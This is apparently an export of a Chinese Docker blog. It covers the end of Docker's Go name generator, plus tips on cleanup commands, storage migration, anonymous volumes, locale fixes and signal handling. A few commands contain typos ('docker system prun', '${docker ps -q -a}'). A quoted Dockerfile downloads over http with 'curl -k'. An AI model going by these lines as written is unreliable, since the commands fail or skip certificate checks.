https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Ambroise\_Par%C3%A9</span><br><span class="line">		&quot;pare&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Louis Pasteur discovered vaccination, fermentation and pasteurization. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Louis\_Pasteur.</span><br><span class="line">		&quot;pasteur&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Cecilia Payne-Gaposchkin was an astronomer and astrophysicist who, in 1925, proposed in her Ph.D. thesis an explanation for the composition of stars in terms of the relative abundances of hydrogen and helium. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Cecilia\_Payne-Gaposchkin</span><br><span class="line">		&quot;payne&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Radia Perlman is a software designer and network engineer and most famous for her invention of the spanning-tree protocol (STP). https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Radia\_Perlman</span><br><span class="line">		&quot;perlman&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Rob Pike was a key contributor to Unix, Plan 9, the X graphic system, utf-8, and the Go programming language. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Rob\_Pike</span><br><span class="line">		&quot;pike&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Henri Poincaré made fundamental contributions in several fields of mathematics. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Henri\_Poincar%C3%A9</span><br><span class="line">		&quot;poincare&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Laura Poitras is a director and producer whose work, made possible by open source crypto tools, advances the causes of truth and freedom of information by reporting disclosures by whistleblowers such as Edward Snowden. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Laura\_Poitras</span><br><span class="line">		&quot;poitras&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Claudius Ptolemy - a Greco-Egyptian writer of Alexandria, known as a mathematician, astronomer, geographer, astrologer, and poet of a single epigram in the Greek Anthology - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Ptolemy</span><br><span class="line">		&quot;ptolemy&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; C. V. Raman - Indian physicist who won the Nobel Prize in 1930 for proposing the Raman effect. - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;C.\_V.\_Raman</span><br><span class="line">		&quot;raman&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Srinivasa Ramanujan - Indian mathematician and autodidact who made extraordinary contributions to mathematical analysis, number theory, infinite series, and continued fractions. - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Srinivasa\_Ramanujan</span><br><span class="line">		&quot;ramanujan&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Sally Kristen Ride was an American physicist and astronaut. She was the first American woman in space, and the youngest American astronaut. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Sally\_Ride</span><br><span class="line">		&quot;ride&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Rita Levi-Montalcini - Won Nobel Prize in Physiology or Medicine jointly with colleague Stanley Cohen for the discovery of nerve growth factor (https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Rita\_Levi-Montalcini)</span><br><span class="line">		&quot;montalcini&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Dennis Ritchie - co-creator of UNIX and the C programming language. - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Dennis\_Ritchie</span><br><span class="line">		&quot;ritchie&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Wilhelm Conrad Röntgen - German physicist who was awarded the first Nobel Prize in Physics in 1901 for the discovery of X-rays (Röntgen rays). https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Wilhelm\_R%C3%B6ntgen</span><br><span class="line">		&quot;roentgen&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Rosalind Franklin - British biophysicist and X-ray crystallographer whose research was critical to the understanding of DNA - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Rosalind\_Franklin</span><br><span class="line">		&quot;rosalind&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Meghnad Saha - Indian astrophysicist best known for his development of the Saha equation, used to describe chemical and physical conditions in stars - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Meghnad\_Saha</span><br><span class="line">		&quot;saha&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Jean E. Sammet developed FORMAC, the first widely used computer language for symbolic manipulation of mathematical formulas. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Jean\_E.\_Sammet</span><br><span class="line">		&quot;sammet&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Carol Shaw - Originally an Atari employee, Carol Shaw is said to be the first female video game designer. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Carol\_Shaw\_(video\_game\_designer)</span><br><span class="line">		&quot;shaw&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Dame Stephanie &quot;Steve&quot; Shirley - Founded a software company in 1962 employing women working from home. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Steve\_Shirley</span><br><span class="line">		&quot;shirley&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; William Shockley co-invented the transistor - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;William\_Shockley</span><br><span class="line">		&quot;shockley&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Françoise Barré-Sinoussi - French virologist and Nobel Prize Laureate in Physiology or Medicine; her work was fundamental in identifying HIV as the cause of AIDS. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Fran%C3%A7oise\_Barr%C3%A9-Sinoussi</span><br><span class="line">		&quot;sinoussi&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Betty Snyder - one of the original programmers of the ENIAC. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;ENIAC - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Betty\_Holberton</span><br><span class="line">		&quot;snyder&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Frances Spence - one of the original programmers of the ENIAC. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;ENIAC - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Frances\_Spence</span><br><span class="line">		&quot;spence&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Richard Matthew Stallman - the founder of the Free Software movement, the GNU project, the Free Software Foundation, and the League for Programming Freedom. He also invented the concept of copyleft to protect the ideals of this movement, and enshrined this concept in the widely-used GPL (General Public License) for software. https:&#x2F;&#x2F;en.wikiquote.org&#x2F;wiki&#x2F;Richard\_Stallman</span><br><span class="line">		&quot;stallman&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Michael Stonebraker is a database research pioneer and architect of Ingres, Postgres, VoltDB and SciDB. Winner of 2014 ACM Turing Award. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Michael\_Stonebraker</span><br><span class="line">		&quot;stonebraker&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Janese Swanson (with others) developed the first of the Carmen Sandiego games. She went on to found Girl Tech. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Janese\_Swanson</span><br><span class="line">		&quot;swanson&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Aaron Swartz was influential in creating RSS, Markdown, Creative Commons, Reddit, and much of the internet as we know it today. He was devoted to freedom of information on the web. https:&#x2F;&#x2F;en.wikiquote.org&#x2F;wiki&#x2F;Aaron\_Swartz</span><br><span class="line">		&quot;swartz&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Bertha Swirles was a theoretical physicist who made a number of contributions to early quantum theory. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Bertha\_Swirles</span><br><span class="line">		&quot;swirles&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Nikola Tesla invented the AC electric system and every gadget ever used by a James Bond villain. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Nikola\_Tesla</span><br><span class="line">		&quot;tesla&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Ken Thompson - co-creator of UNIX and the C programming language - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Ken\_Thompson</span><br><span class="line">		&quot;thompson&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Linus Torvalds invented Linux and Git. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Linus\_Torvalds</span><br><span class="line">		&quot;torvalds&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Alan Turing was a founding father of computer science. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Alan\_Turing.</span><br><span class="line">		&quot;turing&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Varahamihira - Ancient Indian mathematician who discovered trigonometric formulae during 505-587 CE - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Var%C4%81hamihira#Contributions</span><br><span class="line">		&quot;varahamihira&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Sir Mokshagundam Visvesvaraya - is a notable Indian engineer.  He is a recipient of the Indian Republic&#39;s highest honour, the Bharat Ratna, in 1955. On his birthday, 15 September is celebrated as Engineer&#39;s Day in India in his memory - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Visvesvaraya</span><br><span class="line">		&quot;visvesvaraya&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Christiane Nüsslein-Volhard - German biologist, won Nobel Prize in Physiology or Medicine in 1995 for research on the genetic control of embryonic development. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Christiane\_N%C3%BCsslein-Volhard</span><br><span class="line">		&quot;volhard&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Marlyn Wescoff - one of the original programmers of the ENIAC. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;ENIAC - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Marlyn\_Meltzer</span><br><span class="line">		&quot;wescoff&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Andrew Wiles - Notable British mathematician who proved the enigmatic Fermat&#39;s Last Theorem - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Andrew\_Wiles</span><br><span class="line">		&quot;wiles&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Roberta Williams, did pioneering work in graphical adventure games for personal computers, particularly the King&#39;s Quest series. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Roberta\_Williams</span><br><span class="line">		&quot;williams&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Sophie Wilson designed the first Acorn Micro-Computer and the instruction set for ARM processors. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Sophie\_Wilson</span><br><span class="line">		&quot;wilson&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Jeannette Wing - co-developed the Liskov substitution principle. - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Jeannette\_Wing</span><br><span class="line">		&quot;wing&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Steve Wozniak invented the Apple I and Apple II. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Steve\_Wozniak</span><br><span class="line">		&quot;wozniak&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; The Wright brothers, Orville and Wilbur - credited with inventing and building the world&#39;s first successful airplane and making the first controlled, powered and sustained heavier-than-air human flight - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Wright\_brothers</span><br><span class="line">		&quot;wright&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Rosalyn Sussman Yalow - Rosalyn Sussman Yalow was an American medical physicist, and a co-winner of the 1977 Nobel Prize in Physiology or Medicine for development of the radioimmunoassay technique. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Rosalyn\_Sussman\_Yalow</span><br><span class="line">		&quot;yalow&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Ada Yonath - an Israeli crystallographer, the first woman from the Middle East to win a Nobel prize in the sciences. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Ada\_Yonath</span><br><span class="line">		&quot;yonath&quot;,</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; GetRandomName generates a random name from the list of adjectives and surnames in this package</span><br><span class="line">&#x2F;&#x2F; formatted as &quot;adjective\_surname&quot;. For example &#39;focused\_turing&#39;. If retry is non-zero, a random</span><br><span class="line">&#x2F;&#x2F; integer between 0 and 10 will be added to the end of the name, e.g \&#96;focused\_turing3\&#96;</span><br><span class="line">func GetRandomName(retry int) string &#123;</span><br><span class="line">	rnd :&#x3D; random.Rand</span><br><span class="line">begin:</span><br><span class="line">	name :&#x3D; fmt.Sprintf(&quot;%s\_%s&quot;, left\[rnd.Intn(len(left))\], right\[rnd.Intn(len(right))\])</span><br><span class="line">	if name &#x3D;&#x3D; &quot;boring\_wozniak&quot; &#x2F;\* Steve Wozniak is not boring \*&#x2F; &#123;</span><br><span class="line">		goto begin</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if retry &gt; 0 &#123;</span><br><span class="line">		name &#x3D; fmt.Sprintf(&quot;%s%d&quot;, name, rnd.Intn(10))</span><br><span class="line">	&#125;</span><br><span class="line">	return name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>docker几个不常用的命令</title>
    <url>/2020/09/21/Docker%E5%87%A0%E4%B8%AA%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="docker不太常用的命令"><a href="#docker不太常用的命令" class="headerlink" title="docker不太常用的命令"></a>docker不太常用的命令</h2><ul>
<li>docker ps -s #查看容器所占的磁盘大小</li>
<li>docker rm ${docker ps -q -a} # 删除全部非运行态的容器</li>
<li>docker system df #查看docker存储的使用情况</li>
<li>docker system prun #清理无用的容器、网络、数据集</li>
<li>docker rmi $(docker images | awk ‘/^<none>/ { print $3 }’) #删除的镜像repositry为none的镜像</none></li>
</ul>
<h2 id="docker配置参数"><a href="#docker配置参数" class="headerlink" title="docker配置参数"></a>docker配置参数</h2><ol>
<li>--iptables ,该参数用于控制是否允许docker去管理iptables，当设置为true时，允许docker去管理iptbales表<ul>
<li>通常在docker单独使用时，需要这样配置，如果配置为false，iptables被清空后，是无法自动创建的</li>
<li>在基于Kubernetes等管理docker时，可以配置iptables=false</li>
</ul>
</li>
<li>--ip-forward，该参数用于控主机容器与外部网络之间的相互通信，当设置为true时，允许容器被外部访问，当设置为false时，外部是无法访问到容器<ul>
<li>当宿主机设置了ip_forward参数为1时，会以宿主机的配置为准，docker的改配置参数无效</li>
</ul>
</li>
</ol>
<h2 id="迁移docker存储方式一"><a href="#迁移docker存储方式一" class="headerlink" title="迁移docker存储方式一"></a>迁移docker存储方式一</h2><p>若docker已经运行一段时间，并存在运行的容器，可以采用以下方法进行容器存储的迁移</p>
<ol>
<li>停止全部容器</li>
<li>停止docker：systemctl stop docker</li>
<li>mkdir -p /sl/docker/</li>
<li>移动docker存储：mv /var/lib/docker/* /sl/docker/</li>
<li>建立软连接：ln -s /sl/docker /var/lib/</li>
<li>systemctl start docker</li>
</ol>
<p>注意删除软连接是 rm /var/lib/docker 后面不能有斜杠，否则是删除整个目录)</p>
<h2 id="迁移docker存储方式二"><a href="#迁移docker存储方式二" class="headerlink" title="迁移docker存储方式二"></a>迁移docker存储方式二</h2><ol>
<li>停止全部容器</li>
<li>停止docker：systemctl stop docker</li>
<li>cd /sl</li>
<li>mkdir dockerdaemon</li>
<li>cd /sl/dockerdaemon</li>
<li>tar -czvpf docker.tar.gz /var/lib/docker</li>
<li>tar zxvf docker.tar.gz -C /sl/dockerdaemon</li>
<li>cd /sl/dockerdaemon/var/lib/</li>
<li>mv docker/ ../../</li>
<li>mv /var/lib/docker /sl/backup</li>
<li>ln -s /sl/dockerdaemon/docker /var/lib/</li>
</ol>
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>云计算</tag>
        <tag>Container</tag>
      </tags>
  </entry>
  <entry>
    <title>docker匿名卷</title>
    <url>/2020/09/04/Docker%E5%8C%BF%E5%90%8D%E5%8D%B7/</url>
    <content><![CDATA[<p>问题</p>
<p>  在使用dockerhub中的镜像时，我通常会去查看一下该镜像的dockerfile是如何编写的，看看有没有什么好的借鉴思路,经常会发现在dockerfile里面定义Volume，如下面的dockerfile</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM davidcaste&#x2F;alpine-java-unlimited-jce:jdk8</span><br><span class="line"></span><br><span class="line">MAINTAINER David Castellanos &lt;davidcaste@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">ENV TOMCAT_MAJOR&#x3D;8 \</span><br><span class="line">    TOMCAT_VERSION&#x3D;8.5.3 \</span><br><span class="line">    TOMCAT_HOME&#x3D;&#x2F;opt&#x2F;tomcat \</span><br><span class="line">    CATALINA_HOME&#x3D;&#x2F;opt&#x2F;tomcat \</span><br><span class="line">    CATALINA_OUT&#x3D;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">RUN apk upgrade --update &amp;&amp; \</span><br><span class="line">    apk add --update curl &amp;&amp; \</span><br><span class="line">    curl -jksSL -o &#x2F;tmp&#x2F;apache-tomcat.tar.gz http:&#x2F;&#x2F;archive.apache.org&#x2F;dist&#x2F;tomcat&#x2F;tomcat-$&#123;TOMCAT_MAJOR&#125;&#x2F;v$&#123;TOMCAT_VERSION&#125;&#x2F;bin&#x2F;apache-tomcat-$&#123;TOMCAT_VERSION&#125;.tar.gz &amp;&amp; \</span><br><span class="line">    gunzip &#x2F;tmp&#x2F;apache-tomcat.tar.gz &amp;&amp; \</span><br><span class="line">    tar -C &#x2F;opt -xf &#x2F;tmp&#x2F;apache-tomcat.tar &amp;&amp; \</span><br><span class="line">    ln -s &#x2F;opt&#x2F;apache-tomcat-$&#123;TOMCAT_VERSION&#125; $&#123;TOMCAT_HOME&#125; &amp;&amp; \</span><br><span class="line">    rm -rf $&#123;TOMCAT_HOME&#125;&#x2F;webapps&#x2F;* &amp;&amp; \</span><br><span class="line">    apk del curl &amp;&amp; \</span><br><span class="line">    rm -rf &#x2F;tmp&#x2F;* &#x2F;var&#x2F;cache&#x2F;apk&#x2F;*</span><br><span class="line"></span><br><span class="line">COPY logging.properties $&#123;TOMCAT_HOME&#125;&#x2F;conf&#x2F;logging.properties</span><br><span class="line">COPY server.xml $&#123;TOMCAT_HOME&#125;&#x2F;conf&#x2F;server.xml</span><br><span class="line"></span><br><span class="line">VOLUME [&quot;&#x2F;logs&quot;]</span><br><span class="line">EXPOSE 8080</span><br></pre></td></tr></table></figure>
<p>   在上面的dockerfile中就定义了 VOLUME [“/logs”],刚开始的时候并没有注意这个，以为就是提示作用而已，直到在自己的环境中出现了存储不足的问题，在环境中我将全部的镜像、容器 都删除了，但是只是释放了一点点的空间，使用下面的命令，进行查看，发现还是占用了很多空间,</p>
<p>du -h –max-depth=1 /var/lib/docker<br>在服务器上执行了</p>
<p>docker volume ls<br>发现存在大量的卷类型为local的卷，进入到这些目录，发现全是原容器内的/logs 目录的内容，虽然容器被删除了，但是/logs 目录以容器卷的方式被持久化下来了，这显示并不是我想要的现象。解释这个现象的就是docker匿名卷了。</p>
<p>docker匿名卷</p>
<p>docker匿名卷的解释可以参考这里docker匿名卷</p>
<p>  匿名卷的目的是为了防止用户忘记将关键数据挂载到宿主机目录，为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 dockerfile中，我们可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。</p>
<p>VOLUME /data<br>  这里的 /data 目录就会在运行时自动挂载为匿名卷，任何向 /data 中写入的信息都不会记录进容器存储层，从而保证了容器存储层的无状态化。当然，运行时可以覆盖这个挂载设置。比如：</p>
<p>docker run -d -v mydata:/data xxxx</p>
<p>  在这行命令中，就使用了 mydata 这个命名卷挂载到了 /data 这个位置，替代了 dockerfile 中定义的匿名卷的挂载配置。</p>
<p>Summary</p>
<p>docker匿名卷使用还是的慎重，而且需要通知到使用者，不然存储莫名其妙的用光了</p>
]]></content>
  </entry>
  <entry>
    <title>docker基础镜像debain的乱码问题</title>
    <url>/2020/09/04/Docker%E5%9F%BA%E7%A1%80%E9%95%9C%E5%83%8Fdebain%E7%9A%84%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>问题</p>
<p>公司内的项目在进行容器化并实现DevOps的时候，由于代码文件编码的问题，出现了乱码问题，在windows环境下，正常没有问题，首先看一下前期基于debain+nodejs+ionic构建的用于项目打包的基础镜像，镜像文件如下所示：</p>
<p>FROM 10.10.70.65/base/andreptb/maven:3.3.9-jdk8<br>COPY settings.xml /usr/share/maven/conf/settings.xml<br>COPY linux-x64-57_binding.node /usr/local/<br>ENV SASS_BINARY_PATH=/usr/local/linux-x64-48_binding.node<br>COPY  node-v8.6.0-linux-x64.tar.gz /home/node-v8.6.0-linux-x64.tar.gz<br>WORKDIR /home/<br>RUN tar xvf node-v8.6.0-linux-x64.tar.gz <br>    &amp;&amp; mv node-v8.6.0-linux-x64/ /usr/local/<br>RUN echo ‘’ &gt; /etc/apt/sources.list.d/jessie-backports.list <br>  &amp;&amp; echo “deb <a href="http://mirrors.aliyun.com/debian" target="_blank" rel="noopener">http://mirrors.aliyun.com/debian</a> jessie main contrib non-free” &gt; /etc/apt/sources.list <br>  &amp;&amp; echo “deb <a href="http://mirrors.aliyun.com/debian" target="_blank" rel="noopener">http://mirrors.aliyun.com/debian</a> jessie-updates main contrib non-free” &gt;&gt; /etc/apt/sources.list <br>  &amp;&amp; echo “deb <a href="http://mirrors.aliyun.com/debian-security" target="_blank" rel="noopener">http://mirrors.aliyun.com/debian-security</a> jessie/updates main contrib non-free” &gt;&gt; /etc/apt/sources.list</p>
<p>RUN apt-get update &amp;&amp; apt-get install -y libltdl7<br>RUN  export PATH=/usr/local/node-v8.6.0-linux-x64/bin:$PATH <br>   &amp;&amp; npm config set registry <a href="https://registry.npm.taobao.org/" target="_blank" rel="noopener">https://registry.npm.taobao.org</a> <br>   &amp;&amp; npm install -g @angular/cli <br>   &amp;&amp; npm install uglify-js -g <br>   &amp;&amp; npm install -g cordova <br>   &amp;&amp; npm install -g ionic<br>ENV PATH=/usr/local/node-v8.6.0-linux-x64/bin:$PATH<br>基于上述镜像，制作的war包，对于中文，会出现乱码问题，如下所示</p>
<pre><code>&lt;display-name&gt;????????????????????????&lt;/display-name&gt;
&lt;context-param&gt;
    &lt;param-name&gt;webAppRootKey&lt;/param-name&gt;
    &lt;param-value&gt;dfweb.root&lt;/param-value&gt;
&lt;/context-param&gt;</code></pre>
<p>尝试在pom.xml上增加以下配置，并未解决问题，但是这应该是必须的配置<br>&lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;<br>在windows环境和centos 环境下进行了mvn package，都未出现乱码问题，最终怀疑是基础镜像的语言环境问题，查看Centos7的语言环境如下所示：<br>[root@RD65 ~]# locale<br>LANG=en_US.UTF-8<br>LC_CTYPE=”en_US.UTF-8”<br>LC_NUMERIC=”en_US.UTF-8”<br>LC_TIME=”en_US.UTF-8”<br>LC_COLLATE=”en_US.UTF-8”<br>LC_MONETARY=”en_US.UTF-8”<br>LC_MESSAGES=”en_US.UTF-8”<br>LC_PAPER=”en_US.UTF-8”<br>LC_NAME=”en_US.UTF-8”<br>LC_ADDRESS=”en_US.UTF-8”<br>LC_TELEPHONE=”en_US.UTF-8”<br>LC_MEASUREMENT=”en_US.UTF-8”<br>LC_IDENTIFICATION=”en_US.UTF-8”<br>LC_ALL=<br>查看基础镜像的语言环境如下所示：</p>
<p>root@82f9c92e247c:/home# locale<br>LANG=<br>LANGUAGE=<br>LC_CTYPE=”POSIX”<br>LC_NUMERIC=”POSIX”<br>LC_TIME=”POSIX”<br>LC_COLLATE=”POSIX”<br>LC_MONETARY=”POSIX”<br>LC_MESSAGES=”POSIX”<br>LC_PAPER=”POSIX”<br>LC_NAME=”POSIX”<br>LC_ADDRESS=”POSIX”<br>LC_TELEPHONE=”POSIX”<br>LC_MEASUREMENT=”POSIX”<br>LC_IDENTIFICATION=”POSIX”<br>LC_ALL=</p>
<p>解决方法</p>
<p>修改基础镜像的dockerfile</p>
<p>FROM 10.10.70.65/base/andreptb/maven:3.3.9-jdk8<br>COPY settings.xml /usr/share/maven/conf/settings.xml<br>COPY linux-x64-57_binding.node /usr/local/<br>ENV SASS_BINARY_PATH=/usr/local/linux-x64-48_binding.node<br>COPY  node-v8.6.0-linux-x64.tar.gz /home/node-v8.6.0-linux-x64.tar.gz<br>WORKDIR /home/<br>RUN tar xvf node-v8.6.0-linux-x64.tar.gz <br>    &amp;&amp; mv node-v8.6.0-linux-x64/ /usr/local/<br>RUN echo ‘’ &gt; /etc/apt/sources.list.d/jessie-backports.list <br>  &amp;&amp; echo “deb <a href="http://mirrors.aliyun.com/debian" target="_blank" rel="noopener">http://mirrors.aliyun.com/debian</a> jessie main contrib non-free” &gt; /etc/apt/sources.list <br>  &amp;&amp; echo “deb <a href="http://mirrors.aliyun.com/debian" target="_blank" rel="noopener">http://mirrors.aliyun.com/debian</a> jessie-updates main contrib non-free” &gt;&gt; /etc/apt/sources.list <br>  &amp;&amp; echo “deb <a href="http://mirrors.aliyun.com/debian-security" target="_blank" rel="noopener">http://mirrors.aliyun.com/debian-security</a> jessie/updates main contrib non-free” &gt;&gt; /etc/apt/sources.list</p>
<p>RUN apt-get update &amp;&amp; apt-get install -y libltdl7<br>RUN  export PATH=/usr/local/node-v8.6.0-linux-x64/bin:$PATH <br>   &amp;&amp; npm config set registry <a href="https://registry.npm.taobao.org/" target="_blank" rel="noopener">https://registry.npm.taobao.org</a> <br>   &amp;&amp; npm install -g @angular/cli <br>   &amp;&amp; npm install uglify-js -g <br>   &amp;&amp; npm install -g cordova <br>   &amp;&amp; npm install -g ionic<br>ENV PATH=/usr/local/node-v8.6.0-linux-x64/bin:$PATH</p>
<p>#config locale<br>RUN sed -i -e ‘s/# en_US.UTF-8 UTF-8/en_US.UTF-8 UTF-8/‘ /etc/locale.gen &amp;&amp; <br>    locale-gen<br>ENV LANGUAGE=en_US.UTF-8<br>ENV LANG=en_US.UTF-8<br>ENV LC_ALL=en_US.UTF-8</p>
]]></content>
  </entry>
  <entry>
    <title>docker容器内的信号处理</title>
    <url>/2020/09/21/Docker%E5%AE%B9%E5%99%A8%E5%86%85%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<p>docker 关闭Container的思路：当我们使用docker stop 命令去关闭Container时，该命令会发送SIGTERM 命令到Container主进程，让主进程处理该信号，关闭Container，如果在10s内，未关闭容器，docker Damon会发送SIGKILL 信号将Container关闭。</p>
<h2 id="Signal"><a href="#Signal" class="headerlink" title="       Signal"></a>       Signal</h2><p>Signal 表示内部进程的一种通信机制，一个信号表示一个从内核发送到进程的消息，该消息表示某个事件已经发生，当进程收到该信号，进程会被打断，一个信号处理句柄会处理该信号，如果没有针对该信号的句柄，会使用默认句柄处理该信号。</p>
<p>进程会将自己可以处理的信号以回调函数的方式注册到系统内核，当你在终端执行一个Kill命令时，实际上你是在通知内核向其他进程发送信号。一个常见的信号时 SIGTERM，该信号时通知进程关闭并终止，当进程收到该信号时，可以执行关闭Socket、数据库连接、删除临时文件等。许多守护进程会处理SIGHUP信号，从而能够重新加载配置文件，SIGUSR1和SIGUSR2是用户自定义的信号，可以在应用中处理该信号。</p>
<p> 举例,在Node.js中处理SIGTERM信号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">process.on(&#39;SIGTERM&#39;, function() &#123;</span><br><span class="line">  console.log(&#39;shutting down...&#39;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p>当进程处理SIGTERM信号时，处理该信号的句柄会将程序的执行打断，当该句柄执行完成后，程序才会继续运行，常见的信号如下表所示， 除了SIGKILL 和SIGSTOP信号外，其他信号都可以被进程终止</p>
<p> <img src="/2020/09/21/Docker%E5%AE%B9%E5%99%A8%E5%86%85%E7%9A%84%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86/uploads/2016/06/20160630141912_66480.png"></p>
<h2 id="docker中的信号"><a href="#docker中的信号" class="headerlink" title="docker中的信号"></a>docker中的信号</h2><p>docker命令“docker kill”向容器内的主进程发送信号</p>
